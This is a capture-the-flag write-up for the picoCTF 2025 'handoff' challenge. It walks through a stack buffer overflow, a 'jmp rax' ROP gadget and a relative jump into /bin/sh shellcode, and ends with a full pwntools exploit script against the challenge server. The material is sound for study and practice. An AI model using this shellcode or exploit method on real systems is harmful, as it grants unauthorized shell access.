---
author: Viraj Singh
pubDatetime: 2025-03-21T01:17:05Z
modDatetime: 2025-03-21T01:17:05Z
title: picoCTF 2025 - handoff
featured: true
draft: false
tags:
  - pwn
  - picoCTF 2025
  - picoCTF
  - hard
  - shellcode injection
  - ROP
description:
  A writeup for the PicoCTF 2025 binary exploitation challenge, handoff.
---

## Table of contents

## Challenge Information 

400 Points

Tags: Hard, picoCTF 2025, Binary Exploitation, browser_webshell_solvable

Author: SKRUBLAWD

Description:

Download the binary [here](https://challenge-files.picoctf.net/c_shape_facility/2a2a522d05c967aadd33a7d06e77d42a4efcdeb62d0cc40b046d355beb582d7b/handoff) 

Download the source [here](https://challenge-files.picoctf.net/c_shape_facility/2a2a522d05c967aadd33a7d06e77d42a4efcdeb62d0cc40b046d355beb582d7b/handoff.c) 

Connect to the program with netcat: 

`$ nc shape-facility.picoctf.net 50924`

Challenge Link: [https://play.picoctf.org/practice/challenge/486](https://play.picoctf.org/practice/challenge/486)

## Explanation

### Securities

Before we start we can look at the securities enabled using `checksec`:
```bash
└─$ checksec --file=handoff
RELRO           STACK CANARY      NX            PIE             RPATH      
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH
```
\* I omitted irrelevant information from the `checksec` output
### Analyze the C file

We start by analyzing the C source code. 
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define MAX_ENTRIES 10
#define NAME_LEN 32
#define MSG_LEN 64

typedef struct entry {
	char name[8];
	char msg[64];
} entry_t;

void print_menu() {
	puts("What option would you like to do?");
	puts("1. Add a new recipient");
	puts("2. Send a message to a recipient");
	puts("3. Exit the app");
}

int vuln() {
	char feedback[8];
	entry_t entries[10];
	int total_entries = 0;
	int choice = -1;
	// Have a menu that allows the user to write whatever they want to a set buffer elsewhere in memory
	while (true) {
		print_menu();
		if (scanf("%d", &choice) != 1) exit(0);
		getchar(); // Remove trailing \n

		// Add entry
		if (choice == 1) {
			choice = -1;
			// Check for max entries
			if (total_entries >= MAX_ENTRIES) {
				puts("Max recipients reached!");
				continue;
			}

			// Add a new entry
			puts("What's the new recipient's name: ");
			fflush(stdin);
			fgets(entries[total_entries].name, NAME_LEN, stdin);
			total_entries++;
			
		}
		// Add message
		else if (choice == 2) {
			choice = -1;
			puts("Which recipient would you like to send a message to?");
			if (scanf("%d", &choice) != 1) exit(0);
			getchar();

			if (choice >= total_entries) {
				puts("Invalid entry number");
				continue;
			}

			puts("What message would you like to send them?");
			fgets(entries[choice].msg, MSG_LEN, stdin);
		}
		else if (choice == 3) {
			choice = -1;
			puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");
			fgets(feedback, NAME_LEN, stdin);
			feedback[7] = '\0';
			break;
		}
		else {
			choice = -1;
			puts("Invalid option");
		}
	}
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);  // No buffering (immediate output)
	vuln();
	return 0;
}
```
The program does the following:
- Prints a menu with three options and asks the user for input.
- Allows the user to:
    1. Add a new recipient by providing a name (stored in the `entries` array).
    2. Send a message to a recipient by selecting an index and providing a message (stored in the `entries` array).
    3. Exit the program and provide feedback (stored in the `feedback` array).
- Contains a **buffer overflow vulnerability**:
    - The `feedback` array is only 8 bytes, but the program reads up to 32 bytes of input using `fgets(feedback, NAME_LEN, stdin)`.
- Exits the program after collecting feedback or if invalid input is provided.

Since there is no `win` function present in the source code we will likely need a shell. 

### Shellcode Injection
Since NX is disabled, we can make the program execute shellcode off the stack. Looking on shell-storm I found the following shellcode that we can use for this program. 
```python
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
```
We can input these bytes to the `msg` char array in the `entry_t` struct as it allows 64 bytes of input. 
Now, we need to figure out a way can make execution jump to the location of the `msg` char array on the stack. 
### Stack Inspection
We can use gdb to inspect the stack right after we input into the `feedback` buffer.
```
└─$ gdb handoff
gef➤  b *vuln+452
Breakpoint 1 at 0x4013ed
gef➤  r
Starting program: /home/vsingh/Downloads/CTF/picoCTF_2025/pwn/handoff/handoff 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
1
What's the new recipient's name: 
AAAAAAAA
What option would you like to do?
4. Add a new recipient
5. Send a message to a recipient
6. Exit the app
2
Which recipient would you like to send a message to?
0
What message would you like to send them?
BBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE
What option would you like to do?
7. Add a new recipient
8. Send a message to a recipient
9. Exit the app
3
Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: 
FFFF
```
After reaching the breakpoint, we can run
```
gef➤  x/100gx $rsp
0x7fffffffd8d0:	0x646e61682f66666f	0x000000000066666f
0x7fffffffd8e0:	0x4141414141414141	0x4242424242424242
0x7fffffffd8f0:	0x4343434343434343	0x4444444444444444
0x7fffffffd900:	0x4545454545454545	0x000000000000000a
...
0x7fffffffdbb0:	0x46464646ffffdbd0	0x000000010000000a
0x7fffffffdbc0:	0x00007fffffffdbd0	0x000000000040143f
0x7fffffffdbd0:	0x0000000000000001	0x00007ffff7dd5d68
```
Based on this information the `name` char array of the first entry starts at `0x7fffffffd8e0`, the `msg` char array of the first entry starts at `0x7fffffffd8e8`, and the `feedback` char array starts at `0x7fffffffdbb4`.
Also, based on this following disassembly of the main function, it is clear that the value stored at `0x7fffffffdbc8` is the return address of the `vuln` function.
```
000000000040140f <main>:
  40140f:	f3 0f 1e fa          	endbr64
  401413:	55                   	push   %rbp
  401414:	48 89 e5             	mov    %rsp,%rbp
  401417:	48 8b 05 42 2c 00 00 	mov    0x2c42(%rip),%rax        # 404060 <stdout@GLIBC_2.2.5>
  40141e:	b9 00 00 00 00       	mov    $0x0,%ecx
  401423:	ba 02 00 00 00       	mov    $0x2,%edx
  401428:	be 00 00 00 00       	mov    $0x0,%esi
  40142d:	48 89 c7             	mov    %rax,%rdi
  401430:	e8 ab fc ff ff       	call   4010e0 <setvbuf@plt>
  401435:	b8 00 00 00 00       	mov    $0x0,%eax
  40143a:	e8 ea fd ff ff       	call   401229 <vuln>
  40143f:	b8 00 00 00 00       	mov    $0x0,%eax
  401444:	5d                   	pop    %rbp
  401445:	c3                   	ret
  401446:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40144d:	00 00 00 
```
### Jumping to Shellcode
Since ASLR (Address Space Layout Randomization) is enabled, we cannot overflow the feedback buffer and modify the return address to the address of the shellcode.

We can try using a ROP gadget to perform this task. 
```
└─$ ROPgadget --binary=handoff | grep jmp
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x00000000004012f8 : add dword ptr [rbp - 4], 1 ; jmp 0x401249
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x00000000004011f3 : cli ; jmp 0x401180
0x00000000004011f0 : endbr64 ; jmp 0x401180
0x0000000000401165 : je 0x401170 ; mov edi, 0x404060 ; jmp rax
0x00000000004011a7 : je 0x4011b0 ; mov edi, 0x404060 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004011f4 : jmp 0x401180
0x00000000004012fc : jmp 0x401249
0x00000000004012a5 : jmp 0x401407
0x00000000004013f1 : jmp 0x40140c
0x000000000040100b : jmp 0x4840103f
0x000000000040116c : jmp rax
0x00000000004013ed : mov byte ptr [rbp - 5], 0 ; jmp 0x40140c
0x0000000000401167 : mov edi, 0x404060 ; jmp rax
0x00000000004011ec : nop dword ptr [rax] ; endbr64 ; jmp 0x401180
0x0000000000401166 : or dword ptr [rdi + 0x404060], edi ; jmp rax
0x0000000000401163 : test eax, eax ; je 0x401170 ; mov edi, 0x404060 ; jmp rax
0x00000000004011a5 : test eax, eax ; je 0x4011b0 ; mov edi, 0x404060 ; jmp rax
```
There are several gadgets here that use the jmp instruction. One stood out to me as I remembered something I saw while debugging in gdb:
```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdbb4  →  0x0000000a46464646 ("FFFF\n"?)
$rbx   : 0x00007fffffffdce8  →  0x00007fffffffe070  →  "/home/vsingh/Downloads/CTF/picoCTF_2025/pwn/handof[...]"
$rcx   : 0xa464646         
$rdx   : 0xfbad2288        
$rsp   : 0x00007fffffffd8d0  →  "off/handoff"
$rbp   : 0x00007fffffffdbc0  →  0x00007fffffffdbd0  →  0x0000000000000001
$rsi   : 0xa464646         
$rdi   : 0x00007ffff7f95720  →  0x0000000000000000
$rip   : 0x00000000004013ed  →  <vuln+01c4> mov BYTE PTR [rbp-0x5], 0x0
$r8    : 0x00000000004052a5  →  "BBBCCCCCCCCDDDDDDDDEEEEEEEE\n"
$r9    : 0x0               
$r10   : 0x00007ffff7f3afe0  →  0x0000000100000000
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x00007fffffffdcf8  →  0x00007fffffffe0ac  →  "SHELL=/bin/bash"
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
```
The `$rax` register contains the stack address of the start of the feedback buffer. 

We can use the `jmp rax` gadget to jump to this address and begin the shellcode execution. 
```
0x000000000040116c : jmp rax
```
Since the feedback buffer obviously does not have enough space for the entire shellcode we can perform a relative jump to the shellcode in the `msg` char array in the first entry. 
We can do:
```
(feedback array address) - (msg array address) - (length of jmp instruction)
0x7fffffffdbb4 - 0x7fffffffd8e8 - 0x5 = 0xfffffd2f (-721)
```
The assembly code for this would be:
```asm
E9 2f FD FF FF   ; JMP -716
```
We can write this in bytes as:
```
jmp_bytes = b'\xe9\x2f\xfd\xff\xff'
```
## Summary
We can input shellcode in the `msg` char array of the first entry. Then we can take advantage of the buffer overflow vulnerability and overwrite the return address and modify it to the address of the `jmp rax` ROP gadget. Since `$rax` contains the address of the beginning of the feedback buffer, we need to input `jmp_bytes` before we overflow. 
## Full Solution
```python
from pwn import *

# Set up the connection
context.arch = 'amd64'
context.log_level = 'critical'

p = remote('shape-facility.picoctf.net', 50924)

# execute /bin/sh shellcode
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
# jmp rax address
jmp_rax = 0x40116c
# jmp -721 shellcode
jmp_bytes = b'\xe9\x2f\xfd\xff\xff'

# Inject shellcode
p.sendlineafter(b'3. Exit the app\n', b'1')
p.sendlineafter(b"What's the new recipient's name: \n", b"\x90" * 8) 

p.sendlineafter(b'3. Exit the app\n', b'2')
p.sendlineafter(b'Which recipient would you like to send a message to?\n', b'0')
p.sendlineafter(b'What message would you like to send them?\n', shellcode)

# Add jmp -721 bytes code (to jump to shellcode) and some padding
payload = jmp_bytes + b'B' * 7 + b'C' * 8
# Overwrite return address with jmp rax gadget
payload += p64(jmp_rax) 

p.sendlineafter(b'3. Exit the app\n', b'3')
p.sendlineafter(b'If you could take a second to write a quick review, we would really appreciate it: \n', payload)

# Access shell
p.interactive() 

```
## References 
- [Shell-Storm - [Linux/x86-64 - Execute /bin/sh - 27 bytes] by Dad`](https://shell-storm.org/shellcode/files/shellcode-806.html)
- [Injecting Shellcode | PicoCTF [37] Shellz by John Hammond](https://www.youtube.com/watch?v=D1yzO0hd5Po&t=229s)
